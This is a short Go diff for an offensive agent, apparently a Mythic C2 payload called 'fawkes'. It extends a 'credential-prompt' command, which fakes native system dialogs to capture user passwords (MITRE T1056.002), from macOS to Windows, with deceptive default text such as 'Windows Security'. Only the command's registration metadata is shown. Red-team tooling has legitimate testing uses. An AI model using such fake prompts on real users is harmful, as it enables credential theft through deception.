@@ -9,15 +9,15 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "credential-prompt",
-		Description:         "Display a native macOS credential dialog to capture user credentials",
-		HelpString:          "credential-prompt [-title \"Update Required\"] [-message \"macOS needs your password...\"] [-icon caution]",
+		Description:         "Display a native credential dialog to capture user credentials. macOS: AppleScript dialog. Windows: CredUI prompt.",
+		HelpString:          "credential-prompt [-title \"Windows Security\"] [-message \"Enter your credentials...\"] [-icon caution]",
 		Version:             1,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1056.002"}, // Input Capture: GUI Input Capture
 		ScriptOnlyCommand:   false,
 		CommandAttributes: agentstructs.CommandAttribute{
-			SupportedOS: []string{agentstructs.SUPPORTED_OS_MACOS},
+			SupportedOS: []string{agentstructs.SUPPORTED_OS_MACOS, agentstructs.SUPPORTED_OS_WINDOWS},
 		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
